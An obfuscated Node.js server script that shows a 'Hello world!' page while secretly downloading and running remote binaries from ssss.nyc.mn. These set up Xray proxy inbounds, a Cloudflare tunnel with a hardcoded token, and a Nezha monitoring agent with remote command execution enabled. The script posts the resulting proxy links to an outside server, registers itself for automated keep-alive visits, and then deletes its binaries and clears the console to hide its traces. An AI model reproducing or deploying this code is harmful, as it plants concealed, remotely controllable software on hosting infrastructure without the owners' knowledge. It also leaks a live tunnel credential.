const _0x429be3=_0xc6c3;(function(_0x59995c,_0x25c9fb){const _0x3b0c2d=_0xc6c3,_0x3ea2e7=_0x59995c();while(!![]){try{const _0x234f16=parseInt(_0x3b0c2d(0x23d))/0x1+parseInt(_0x3b0c2d(0x24b))/0x2*(-parseInt(_0x3b0c2d(0x26b))/0x3)+parseInt(_0x3b0c2d(0x25d))/0x4+-parseInt(_0x3b0c2d(0x21a))/0x5+-parseInt(_0x3b0c2d(0x1f4))/0x6+parseInt(_0x3b0c2d(0x235))/0x7+parseInt(_0x3b0c2d(0x265))/0x8*(-parseInt(_0x3b0c2d(0x256))/0x9);if(_0x234f16===_0x25c9fb)break;else _0x3ea2e7['push'](_0x3ea2e7['shift']());}catch(_0x27464e){_0x3ea2e7['push'](_0x3ea2e7['shift']());}}}(_0x398e,0x29fa3));const express=require(_0x429be3(0x2a7)),app=express(),axios=require(_0x429be3(0x24a)),os=require('os'),fs=require('fs'),path=require(_0x429be3(0x250)),{promisify}=require(_0x429be3(0x295)),exec=promisify(require('child_process')[_0x429be3(0x234)]),{execSync}=require(_0x429be3(0x202)),UPLOAD_URL=process[_0x429be3(0x284)][_0x429be3(0x278)]||'',PROJECT_URL=process[_0x429be3(0x284)][_0x429be3(0x27c)]||'',AUTO_ACCESS=process[_0x429be3(0x284)][_0x429be3(0x279)]||![],FILE_PATH=process[_0x429be3(0x284)]['FILE_PATH']||_0x429be3(0x215),SUB_PATH=process['env'][_0x429be3(0x240)]||'sub',PORT=process[_0x429be3(0x284)]['SERVER_PORT']||process[_0x429be3(0x284)][_0x429be3(0x224)]||0xbb8,UUID=process[_0x429be3(0x284)][_0x429be3(0x270)]||_0x429be3(0x293),NEZHA_SERVER=process['env'][_0x429be3(0x21f)]||'',NEZHA_PORT=process[_0x429be3(0x284)][_0x429be3(0x25e)]||'',NEZHA_KEY=process[_0x429be3(0x284)][_0x429be3(0x252)]||'',ARGO_DOMAIN=process[_0x429be3(0x284)][_0x429be3(0x2ad)]||_0x429be3(0x249),ARGO_AUTH=process['env'][_0x429be3(0x246)]||_0x429be3(0x20e),ARGO_PORT=process['env'][_0x429be3(0x229)]||0x1f41,CFIP=process[_0x429be3(0x284)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x429be3(0x284)][_0x429be3(0x220)]||0x1bb,NAME=process['env'][_0x429be3(0x1fa)]||_0x429be3(0x231);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x429be3(0x280)](FILE_PATH+_0x429be3(0x274))):console[_0x429be3(0x280)](FILE_PATH+_0x429be3(0x28d));function generateRandomName(){const _0x44fa00=_0x429be3,_0x3c9d56=_0x44fa00(0x1f5);let _0x4f77ea='';for(let _0xef2785=0x0;_0xef2785<0x6;_0xef2785++){_0x4f77ea+=_0x3c9d56[_0x44fa00(0x1fc)](Math[_0x44fa00(0x24d)](Math[_0x44fa00(0x2a6)]()*_0x3c9d56[_0x44fa00(0x271)]));}return _0x4f77ea;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x429be3(0x262)](FILE_PATH,npmName),phpPath=path[_0x429be3(0x262)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x429be3(0x262)](FILE_PATH,botName),subPath=path[_0x429be3(0x262)](FILE_PATH,'sub.txt'),listPath=path[_0x429be3(0x262)](FILE_PATH,'list.txt'),bootLogPath=path[_0x429be3(0x262)](FILE_PATH,_0x429be3(0x219)),configPath=path[_0x429be3(0x262)](FILE_PATH,_0x429be3(0x1f7));function deleteNodes(){const _0x32e249=_0x429be3;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2a671b;try{_0x2a671b=fs[_0x32e249(0x2a8)](subPath,_0x32e249(0x263));}catch{return null;}const _0xa7e135=Buffer['from'](_0x2a671b,_0x32e249(0x22f))['toString'](_0x32e249(0x263)),_0x333445=_0xa7e135['split']('\x0a')[_0x32e249(0x27d)](_0x1e18c0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1e18c0));if(_0x333445['length']===0x0)return;return axios[_0x32e249(0x1f8)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x32e249(0x27a)]({'nodes':_0x333445}),{'headers':{'Content-Type':_0x32e249(0x28b)}})['catch'](_0x55e4f8=>{return null;}),null;}catch(_0x236b5b){return null;}}function cleanupOldFiles(){const _0x425198=_0x429be3;try{const _0x210847=fs[_0x425198(0x299)](FILE_PATH);_0x210847[_0x425198(0x216)](_0x10228d=>{const _0x5a6341=_0x425198,_0x11f482=path[_0x5a6341(0x262)](FILE_PATH,_0x10228d);try{const _0x35e112=fs[_0x5a6341(0x28c)](_0x11f482);_0x35e112[_0x5a6341(0x228)]()&&fs[_0x5a6341(0x288)](_0x11f482);}catch(_0x5e543b){}});}catch(_0x23d9da){}}app[_0x429be3(0x2b0)]('/',function(_0x1d6a80,_0x222a36){const _0xc71d70=_0x429be3;_0x222a36[_0xc71d70(0x22d)](_0xc71d70(0x20a));});async function generateConfig(){const _0x5a3dc9=_0x429be3,_0x41ca7f={'log':{'access':_0x5a3dc9(0x1fd),'error':_0x5a3dc9(0x1fd),'loglevel':_0x5a3dc9(0x287)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5a3dc9(0x1f6),'settings':{'clients':[{'id':UUID,'flow':_0x5a3dc9(0x277)}],'decryption':_0x5a3dc9(0x287),'fallbacks':[{'dest':0xbb9},{'path':_0x5a3dc9(0x2ac),'dest':0xbba},{'path':_0x5a3dc9(0x275),'dest':0xbbb},{'path':_0x5a3dc9(0x281),'dest':0xbbc}]},'streamSettings':{'network':_0x5a3dc9(0x267)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x5a3dc9(0x1f6),'settings':{'clients':[{'id':UUID}],'decryption':_0x5a3dc9(0x287)},'streamSettings':{'network':_0x5a3dc9(0x267),'security':_0x5a3dc9(0x287)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5a3dc9(0x1f6),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5a3dc9(0x287)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5a3dc9(0x298),_0x5a3dc9(0x266),_0x5a3dc9(0x29e)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5a3dc9(0x28a),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5a3dc9(0x275)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5a3dc9(0x266),_0x5a3dc9(0x29e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5a3dc9(0x20b),'protocol':_0x5a3dc9(0x2af),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5a3dc9(0x281)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5a3dc9(0x266),_0x5a3dc9(0x29e)],'metadataOnly':![]}}],'dns':{'servers':[_0x5a3dc9(0x28e)]},'outbounds':[{'protocol':_0x5a3dc9(0x248),'tag':'direct'},{'protocol':_0x5a3dc9(0x2a2),'tag':'block'}]};fs[_0x5a3dc9(0x203)](path[_0x5a3dc9(0x262)](FILE_PATH,'config.json'),JSON[_0x5a3dc9(0x27a)](_0x41ca7f,null,0x2));}function getSystemArchitecture(){const _0x51b21e=_0x429be3,_0x522d54=os[_0x51b21e(0x272)]();return _0x522d54===_0x51b21e(0x223)||_0x522d54==='arm64'||_0x522d54==='aarch64'?_0x51b21e(0x223):'amd';}function downloadFile(_0x403594,_0xcca204,_0x1f90e9){const _0x43233a=_0x429be3,_0x3198ee=_0x403594;!fs['existsSync'](FILE_PATH)&&fs[_0x43233a(0x29c)](FILE_PATH,{'recursive':!![]});const _0x479e84=fs['createWriteStream'](_0x3198ee);axios({'method':'get','url':_0xcca204,'responseType':'stream'})[_0x43233a(0x22c)](_0x37edc4=>{const _0x52a77e=_0x43233a;_0x37edc4['data'][_0x52a77e(0x285)](_0x479e84),_0x479e84['on'](_0x52a77e(0x276),()=>{const _0x5a1723=_0x52a77e;_0x479e84['close'](),console[_0x5a1723(0x280)](_0x5a1723(0x242)+path[_0x5a1723(0x23e)](_0x3198ee)+_0x5a1723(0x26c)),_0x1f90e9(null,_0x3198ee);}),_0x479e84['on'](_0x52a77e(0x213),_0x403b0b=>{const _0x310250=_0x52a77e;fs[_0x310250(0x258)](_0x3198ee,()=>{});const _0x523c83=_0x310250(0x242)+path[_0x310250(0x23e)](_0x3198ee)+_0x310250(0x217)+_0x403b0b['message'];console[_0x310250(0x213)](_0x523c83),_0x1f90e9(_0x523c83);});})[_0x43233a(0x243)](_0x2e9fda=>{const _0x1f1a61=_0x43233a,_0x1d51cb=_0x1f1a61(0x242)+path[_0x1f1a61(0x23e)](_0x3198ee)+_0x1f1a61(0x217)+_0x2e9fda[_0x1f1a61(0x282)];console[_0x1f1a61(0x213)](_0x1d51cb),_0x1f90e9(_0x1d51cb);});}async function downloadFilesAndRun(){const _0x55a918=_0x429be3,_0x3ff634=getSystemArchitecture(),_0x3d48b5=getFilesForArchitecture(_0x3ff634);if(_0x3d48b5[_0x55a918(0x271)]===0x0){console['log'](_0x55a918(0x29d));return;}const _0x23ff23=_0x3d48b5[_0x55a918(0x230)](_0x524bef=>{return new Promise((_0x223883,_0x76f956)=>{const _0xa95370=_0xc6c3;downloadFile(_0x524bef[_0xa95370(0x1f9)],_0x524bef[_0xa95370(0x1f3)],(_0x1d9aae,_0x5f23d3)=>{_0x1d9aae?_0x76f956(_0x1d9aae):_0x223883(_0x5f23d3);});});});try{await Promise['all'](_0x23ff23);}catch(_0x3088ea){console[_0x55a918(0x213)](_0x55a918(0x2a1),_0x3088ea);return;}function _0x1b6618(_0x1954e4){const _0x3bffee=0x1fd;_0x1954e4['forEach'](_0x21410b=>{const _0x808a38=_0xc6c3;fs[_0x808a38(0x21c)](_0x21410b)&&fs['chmod'](_0x21410b,_0x3bffee,_0x1af32c=>{const _0x14073d=_0x808a38;_0x1af32c?console[_0x14073d(0x213)]('Empowerment\x20failed\x20for\x20'+_0x21410b+':\x20'+_0x1af32c):console['log'](_0x14073d(0x244)+_0x21410b+':\x20'+_0x3bffee[_0x14073d(0x205)](0x8));});});}const _0x1b8ac2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1b6618(_0x1b8ac2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x35d125=NEZHA_SERVER[_0x55a918(0x2a4)](':')?NEZHA_SERVER[_0x55a918(0x269)](':')['pop']():'',_0x5469bd=new Set([_0x55a918(0x221),'8443',_0x55a918(0x251),_0x55a918(0x268),_0x55a918(0x2a3),'2053']),_0x4e2b4a=_0x5469bd[_0x55a918(0x257)](_0x35d125)?'true':_0x55a918(0x283),_0x477aff='\x0aclient_secret:\x20'+NEZHA_KEY+_0x55a918(0x2aa)+NEZHA_SERVER+_0x55a918(0x2a0)+_0x4e2b4a+_0x55a918(0x207)+UUID;fs[_0x55a918(0x203)](path['join'](FILE_PATH,'config.yaml'),_0x477aff);const _0x50f35f=_0x55a918(0x264)+phpPath+_0x55a918(0x236)+FILE_PATH+_0x55a918(0x27e);try{await exec(_0x50f35f),console[_0x55a918(0x280)](phpName+_0x55a918(0x261)),await new Promise(_0x23054=>setTimeout(_0x23054,0x3e8));}catch(_0x9457f8){console['error'](_0x55a918(0x286)+_0x9457f8);}}else{let _0xcbd144='';const _0x43fbfa=[_0x55a918(0x221),_0x55a918(0x245),'2096',_0x55a918(0x268),_0x55a918(0x2a3),'2053'];_0x43fbfa[_0x55a918(0x2a4)](NEZHA_PORT)&&(_0xcbd144=_0x55a918(0x21e));const _0x2ddf0f=_0x55a918(0x264)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xcbd144+_0x55a918(0x290);try{await exec(_0x2ddf0f),console[_0x55a918(0x280)](npmName+_0x55a918(0x261)),await new Promise(_0x405f0f=>setTimeout(_0x405f0f,0x3e8));}catch(_0x3cacf9){console[_0x55a918(0x213)]('npm\x20running\x20error:\x20'+_0x3cacf9);}}}else console[_0x55a918(0x280)](_0x55a918(0x225));const _0x29eb4c=_0x55a918(0x264)+webPath+_0x55a918(0x291)+FILE_PATH+_0x55a918(0x26a);try{await exec(_0x29eb4c),console[_0x55a918(0x280)](webName+_0x55a918(0x261)),await new Promise(_0x1482d1=>setTimeout(_0x1482d1,0x3e8));}catch(_0x536afa){console[_0x55a918(0x213)](_0x55a918(0x214)+_0x536afa);}if(fs[_0x55a918(0x21c)](botPath)){let _0x3bc457;if(ARGO_AUTH[_0x55a918(0x1fe)](/^[A-Z0-9a-z=]{120,250}$/))_0x3bc457='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3bc457=_0x55a918(0x2ae)+FILE_PATH+_0x55a918(0x24c):_0x3bc457='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x55a918(0x238)+ARGO_PORT;try{await exec(_0x55a918(0x264)+botPath+'\x20'+_0x3bc457+_0x55a918(0x29b)),console[_0x55a918(0x280)](botName+_0x55a918(0x261)),await new Promise(_0x2bfb18=>setTimeout(_0x2bfb18,0x7d0));}catch(_0x25e3f2){console[_0x55a918(0x213)]('Error\x20executing\x20command:\x20'+_0x25e3f2);}}await new Promise(_0x406855=>setTimeout(_0x406855,0x1388));}function getFilesForArchitecture(_0x3d324c){const _0x5b6a54=_0x429be3;let _0x20ab9d;_0x3d324c===_0x5b6a54(0x223)?_0x20ab9d=[{'fileName':webPath,'fileUrl':_0x5b6a54(0x204)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x20ab9d=[{'fileName':webPath,'fileUrl':_0x5b6a54(0x20f)},{'fileName':botPath,'fileUrl':_0x5b6a54(0x226)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2b9661=_0x3d324c==='arm'?_0x5b6a54(0x222):'https://amd64.ssss.nyc.mn/agent';_0x20ab9d[_0x5b6a54(0x292)]({'fileName':npmPath,'fileUrl':_0x2b9661});}else{const _0x468e7b=_0x3d324c===_0x5b6a54(0x223)?_0x5b6a54(0x22e):_0x5b6a54(0x26e);_0x20ab9d[_0x5b6a54(0x292)]({'fileName':phpPath,'fileUrl':_0x468e7b});}}return _0x20ab9d;}function argoType(){const _0x5eb8c5=_0x429be3;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5eb8c5(0x280)](_0x5eb8c5(0x23a));return;}if(ARGO_AUTH[_0x5eb8c5(0x2a4)](_0x5eb8c5(0x273))){fs[_0x5eb8c5(0x203)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4e0f9b=_0x5eb8c5(0x239)+ARGO_AUTH[_0x5eb8c5(0x269)]('\x22')[0xb]+_0x5eb8c5(0x296)+path[_0x5eb8c5(0x262)](FILE_PATH,_0x5eb8c5(0x23c))+_0x5eb8c5(0x247)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x5eb8c5(0x218);fs[_0x5eb8c5(0x203)](path[_0x5eb8c5(0x262)](FILE_PATH,_0x5eb8c5(0x20c)),_0x4e0f9b);}else console[_0x5eb8c5(0x280)](_0x5eb8c5(0x21b));}async function extractDomains(){const _0x3b14bd=_0x429be3;let _0x3555ab;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3555ab=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x3555ab),await _0x3996a3(_0x3555ab);else try{const _0x3c62ac=fs[_0x3b14bd(0x2a8)](path['join'](FILE_PATH,_0x3b14bd(0x219)),'utf-8'),_0x2a1663=_0x3c62ac[_0x3b14bd(0x269)]('\x0a'),_0x38a2fd=[];_0x2a1663[_0x3b14bd(0x216)](_0x1e959c=>{const _0x137580=_0x1e959c['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x137580){const _0x2e895a=_0x137580[0x1];_0x38a2fd['push'](_0x2e895a);}});if(_0x38a2fd[_0x3b14bd(0x271)]>0x0)_0x3555ab=_0x38a2fd[0x0],console[_0x3b14bd(0x280)](_0x3b14bd(0x24f),_0x3555ab),await _0x3996a3(_0x3555ab);else{console[_0x3b14bd(0x280)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x3b14bd(0x262)](FILE_PATH,_0x3b14bd(0x219)));async function _0x432760(){const _0x5f5306=_0x3b14bd;try{process[_0x5f5306(0x233)]===_0x5f5306(0x254)?await exec(_0x5f5306(0x255)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x5f5306(0x25c)+botName['charAt'](0x0)+']'+botName[_0x5f5306(0x20d)](0x1)+_0x5f5306(0x289));}catch(_0x1fbf9d){}}_0x432760(),await new Promise(_0xf41b2b=>setTimeout(_0xf41b2b,0xbb8));const _0x31805b=_0x3b14bd(0x25a)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3b14bd(0x264)+botPath+'\x20'+_0x31805b+'\x20>/dev/null\x202>&1\x20&'),console[_0x3b14bd(0x280)](botName+_0x3b14bd(0x261)),await new Promise(_0x2d5938=>setTimeout(_0x2d5938,0xbb8)),await extractDomains();}catch(_0xa5ba4b){console[_0x3b14bd(0x213)]('Error\x20executing\x20command:\x20'+_0xa5ba4b);}}}catch(_0x895c50){console[_0x3b14bd(0x213)](_0x3b14bd(0x260),_0x895c50);}async function _0x43f3b8(){const _0x2c68c8=_0x3b14bd;try{const _0x240132=await axios[_0x2c68c8(0x2b0)](_0x2c68c8(0x26d),{'timeout':0xbb8});if(_0x240132[_0x2c68c8(0x206)]&&_0x240132[_0x2c68c8(0x206)][_0x2c68c8(0x294)]&&_0x240132[_0x2c68c8(0x206)][_0x2c68c8(0x253)])return _0x240132[_0x2c68c8(0x206)][_0x2c68c8(0x294)]+'_'+_0x240132[_0x2c68c8(0x206)][_0x2c68c8(0x253)];}catch(_0x21eb03){try{const _0x338c12=await axios[_0x2c68c8(0x2b0)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x338c12[_0x2c68c8(0x206)]&&_0x338c12[_0x2c68c8(0x206)]['status']==='success'&&_0x338c12[_0x2c68c8(0x206)][_0x2c68c8(0x201)]&&_0x338c12[_0x2c68c8(0x206)][_0x2c68c8(0x253)])return _0x338c12[_0x2c68c8(0x206)][_0x2c68c8(0x201)]+'_'+_0x338c12[_0x2c68c8(0x206)][_0x2c68c8(0x253)];}catch(_0x30d923){}}return'Unknown';}async function _0x3996a3(_0x4d221c){const _0x13fa20=await _0x43f3b8(),_0x757b41=NAME?NAME+'-'+_0x13fa20:_0x13fa20;return new Promise(_0x3513c5=>{setTimeout(()=>{const _0x5ded75=_0xc6c3,_0x3adb13={'v':'2','ps':''+_0x757b41,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5ded75(0x287),'net':'ws','type':_0x5ded75(0x287),'host':_0x4d221c,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x4d221c,'alpn':'','fp':_0x5ded75(0x200)},_0x200916=_0x5ded75(0x2a9)+UUID+'@'+CFIP+':'+CFPORT+_0x5ded75(0x24e)+_0x4d221c+_0x5ded75(0x259)+_0x4d221c+_0x5ded75(0x22b)+_0x757b41+_0x5ded75(0x1ff)+Buffer['from'](JSON[_0x5ded75(0x27a)](_0x3adb13))['toString'](_0x5ded75(0x22f))+_0x5ded75(0x28f)+UUID+'@'+CFIP+':'+CFPORT+_0x5ded75(0x27f)+_0x4d221c+_0x5ded75(0x259)+_0x4d221c+_0x5ded75(0x297)+_0x757b41+_0x5ded75(0x23f);console[_0x5ded75(0x280)](Buffer[_0x5ded75(0x227)](_0x200916)[_0x5ded75(0x205)](_0x5ded75(0x22f))),fs[_0x5ded75(0x203)](subPath,Buffer[_0x5ded75(0x227)](_0x200916)[_0x5ded75(0x205)]('base64')),console[_0x5ded75(0x280)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x5ded75(0x2b0)]('/'+SUB_PATH,(_0x339844,_0x93e94b)=>{const _0x887c=_0x5ded75,_0x30fcdd=Buffer['from'](_0x200916)[_0x887c(0x205)]('base64');_0x93e94b['set'](_0x887c(0x2ab),_0x887c(0x209)),_0x93e94b[_0x887c(0x22d)](_0x30fcdd);}),_0x3513c5(_0x200916);},0x7d0);});}}function _0xc6c3(_0x3c4fa4,_0x4af048){_0x3c4fa4=_0x3c4fa4-0x1f3;const _0x398e4d=_0x398e();let _0xc6c309=_0x398e4d[_0x3c4fa4];return _0xc6c309;}function _0x398e(){const _0x2133a4=['taskkill\x20/f\x20/im\x20','2360187Qoypge','has','unlink','&fp=firefox&type=ws&host=','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','pkill\x20-f\x20\x22[','1173840EaATBR','NEZHA_PORT','automatic\x20access\x20task\x20added\x20successfully','Error\x20reading\x20boot.log:','\x20is\x20running','join','utf-8','nohup\x20','8qrITQX','tls','tcp','2087','split','/config.json\x20>/dev/null\x202>&1\x20&','319767uOjjAZ','\x20successfully','https://ipapi.co/json/','https://amd64.ssss.nyc.mn/v1','Subscription\x20uploaded\x20successfully','UUID','length','arch','TunnelSecret','\x20is\x20created','/vmess-argo','finish','xtls-rprx-vision','UPLOAD_URL','AUTO_ACCESS','stringify','App\x20is\x20running','PROJECT_URL','filter','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','?security=tls&sni=','log','/trojan-argo','message','false','env','pipe','php\x20running\x20error:\x20','none','unlinkSync','\x22\x20>\x20/dev/null\x202>&1','vmess','application/json','statSync','\x20already\x20exists','https+local://8.8.8.8/dns-query','\x0a\x0atrojan://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-c\x20','unshift','3d244455-b14a-46c9-ae48-4c6ff13586cf','country_code','util','\x0a\x20\x20credentials-file:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','http','readdirSync','Skipping\x20adding\x20automatic\x20access\x20task','\x20>/dev/null\x202>&1\x20&','mkdirSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','quic','listen','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Error\x20downloading\x20files:','blackhole','2083','includes','clear','random','express','readFileSync','\x0avless://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Content-Type','/vless-argo','ARGO_DOMAIN','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','trojan','get','fileUrl','494118ZByxnk','abcdefghijklmnopqrstuvwxyz','vless','config.json','post','fileName','NAME','status','charAt','/dev/null','match','\x0a\x0avmess://','firefox','countryCode','child_process','writeFileSync','https://arm64.ssss.nyc.mn/web','toString','data','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://oooo.serv00.net/add-url','text/plain;\x20charset=utf-8','Hello\x20world!','127.0.0.1','tunnel.yml','substring','eyJhIjoiNDY4ZThhMTdiNGY3YTI0NmIwNDQ5MTU0MmRkMzZjOWMiLCJ0IjoiNjMwMzNjNGUtMjhlMS00NTY4LThmMzktZmFiZDg4Nzk5ZTQ2IiwicyI6IlpETmxNakZsWVRjdE9ESmhOeTAwWkRVMkxUZ3dObU10WVdWaU1UWTBPRFkwWlRZNSJ9','https://amd64.ssss.nyc.mn/web','push','Add\x20automatic\x20access\x20task\x20faild:\x20','Unhandled\x20error\x20in\x20startserver:','error','web\x20running\x20error:\x20','./tmp','forEach','\x20failed:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','boot.log','340450uMeWQD','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','existsSync','\x20>\x20nul\x202>&1','--tls','NEZHA_SERVER','CFPORT','443','https://arm64.ssss.nyc.mn/agent','arm','PORT','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://amd64.ssss.nyc.mn/bot','from','isFile','ARGO_PORT','Error\x20in\x20startserver:','&path=%2Fvless-argo%3Fed%3D2560#','then','send','https://arm64.ssss.nyc.mn/v1','base64','map','railway','rm\x20-rf\x20','platform','exec','444318JyQjGt','\x20-c\x20\x22','response','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20tunnel:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','http\x20server\x20is\x20running\x20on\x20port:','tunnel.json','334280FstZWt','basename','\x0a\x20\x20\x20\x20','SUB_PATH','\x20>/dev/null\x202>&1','Download\x20','catch','Empowerment\x20success\x20for\x20','8443','ARGO_AUTH','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','freedom','railway.satoshi18th.store','axios','2hUdhPn','/tunnel.yml\x20run','floor','?encryption=none&security=tls&sni=','ArgoDomain:','path','2096','NEZHA_KEY','org','win32'];_0x398e=function(){return _0x2133a4;};return _0x398e();}async function uploadNodes(){const _0x3282ec=_0x429be3;if(UPLOAD_URL&&PROJECT_URL){const _0x4f01fb=PROJECT_URL+'/'+SUB_PATH,_0x4b4bf7={'subscription':[_0x4f01fb]};try{const _0x1d3e58=await axios[_0x3282ec(0x1f8)](UPLOAD_URL+'/api/add-subscriptions',_0x4b4bf7,{'headers':{'Content-Type':_0x3282ec(0x28b)}});return _0x1d3e58&&_0x1d3e58[_0x3282ec(0x1fb)]===0xc8?(console[_0x3282ec(0x280)](_0x3282ec(0x26f)),_0x1d3e58):null;}catch(_0x1dd12e){if(_0x1dd12e['response']){if(_0x1dd12e[_0x3282ec(0x237)][_0x3282ec(0x1fb)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3282ec(0x21c)](listPath))return;const _0x38e65e=fs[_0x3282ec(0x2a8)](listPath,_0x3282ec(0x263)),_0x2aca22=_0x38e65e[_0x3282ec(0x269)]('\x0a')[_0x3282ec(0x27d)](_0x226d21=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x226d21));if(_0x2aca22[_0x3282ec(0x271)]===0x0)return;const _0x5a3a2e=JSON['stringify']({'nodes':_0x2aca22});try{const _0x34e13e=await axios[_0x3282ec(0x1f8)](UPLOAD_URL+'/api/add-nodes',_0x5a3a2e,{'headers':{'Content-Type':_0x3282ec(0x28b)}});return _0x34e13e&&_0x34e13e['status']===0xc8?(console[_0x3282ec(0x280)]('Nodes\x20uploaded\x20successfully'),_0x34e13e):null;}catch(_0xfd817c){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x458d4f=_0xc6c3,_0x325239=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x325239[_0x458d4f(0x210)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x325239[_0x458d4f(0x210)](phpPath);process[_0x458d4f(0x233)]===_0x458d4f(0x254)?exec('del\x20/f\x20/q\x20'+_0x325239['join']('\x20')+_0x458d4f(0x21d),_0x554d8b=>{const _0x2475d7=_0x458d4f;console['clear'](),console[_0x2475d7(0x280)]('App\x20is\x20running'),console[_0x2475d7(0x280)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x458d4f(0x232)+_0x325239['join']('\x20')+_0x458d4f(0x241),_0x1abf99=>{const _0x282d8f=_0x458d4f;console[_0x282d8f(0x2a5)](),console[_0x282d8f(0x280)](_0x282d8f(0x27b)),console[_0x282d8f(0x280)](_0x282d8f(0x25b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2ca1d1=_0x429be3;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2ca1d1(0x280)](_0x2ca1d1(0x29a));return;}try{const _0x3be352=await axios['post'](_0x2ca1d1(0x208),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x2ca1d1(0x280)](_0x2ca1d1(0x25f)),_0x3be352;}catch(_0x3f7a27){return console[_0x2ca1d1(0x213)](_0x2ca1d1(0x211)+_0x3f7a27[_0x2ca1d1(0x282)]),null;}}async function startserver(){const _0x282fc9=_0x429be3;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x37a3fd){console[_0x282fc9(0x213)](_0x282fc9(0x22a),_0x37a3fd);}}startserver()['catch'](_0x28f36c=>{const _0x3d257a=_0x429be3;console[_0x3d257a(0x213)](_0x3d257a(0x212),_0x28f36c);}),app[_0x429be3(0x29f)](PORT,()=>console[_0x429be3(0x280)](_0x429be3(0x23b)+PORT+'!'));
